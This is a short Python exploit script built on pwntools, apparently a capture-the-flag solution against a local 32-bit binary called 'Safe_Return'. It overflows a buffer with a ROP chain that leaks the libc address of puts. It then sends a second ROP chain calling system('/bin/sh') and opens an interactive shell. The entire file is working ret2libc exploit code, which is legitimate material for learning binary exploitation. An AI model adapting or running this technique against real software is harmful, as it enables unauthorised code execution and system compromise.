from pwn import *

elf = context.binary = ELF("./Safe_Return")
libc = ELF("./libc.so.6")

p = process([elf.path], env={"LD_PRELOAD": libc.path})

if args.GDB:
    gdb.attach(p, '''
      set follow-fork-mode child
      continue
    ''')

puts_plt = elf.plt['puts']
safe_func = elf.symbols['safe_function']

OFFSET = cyclic_find(0x61616175) - 4 # 80-4

# first ROP: puts ( puts@got ), return to safe_func
payload = flat(b"A" * OFFSET, p32(puts_plt), p32(safe_func), p32(elf.got['puts']))

p.sendline(b"asdfg")
p.clean()
p.sendline(payload)

# use *( puts@got ) for libc leak
puts_leak = u32(p.clean()[:4])
libc.address = puts_leak - libc.symbols["puts"]

binsh = next(libc.search(b"/bin/sh"))
log.info("/bin/sh: 0x%08x", binsh)

# second ROP: system ( /bin/sh ), return to 0x0
payload = flat(b"A" * OFFSET, p32(libc.symbols["system"]), p32(0), p32(binsh))
p.sendline(payload)

# Done
p.interactive()
